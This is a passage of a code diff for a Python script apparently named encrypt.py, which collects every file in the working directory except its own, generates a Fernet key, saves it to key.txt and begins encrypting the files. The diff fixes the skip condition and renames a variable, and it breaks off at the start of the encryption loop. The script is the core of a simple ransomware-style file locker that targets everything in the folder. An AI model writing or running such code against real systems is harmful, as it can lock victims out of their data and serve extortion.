@@ -9,8 +9,13 @@ files = []
 ## make this into a function instead so we can do so
 
 for file in os.listdir():
-    # avoid acciently locking out current progress
-    if file == "decrypt.py" or file == "encrypt.py" or file == "key.txt" or "README.md":
+    # avoid acciently locking out current progress, this can get annoying
+    if (
+        file == "decrypt.py"
+        or file == "encrypt.py"
+        or file == "key.txt"
+        or file == "README.md"
+    ):
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -21,8 +26,8 @@ key = Fernet.generate_key()
 print(key)
 
 # writing the key to a file for now
-with open("key.txt", "wb") as thekey:
-    thekey.write(key)
+with open("key.txt", "wb") as key_file:
+    key_file.write(key)
 
 for file in files:
     with open(file, "rb") as _file:
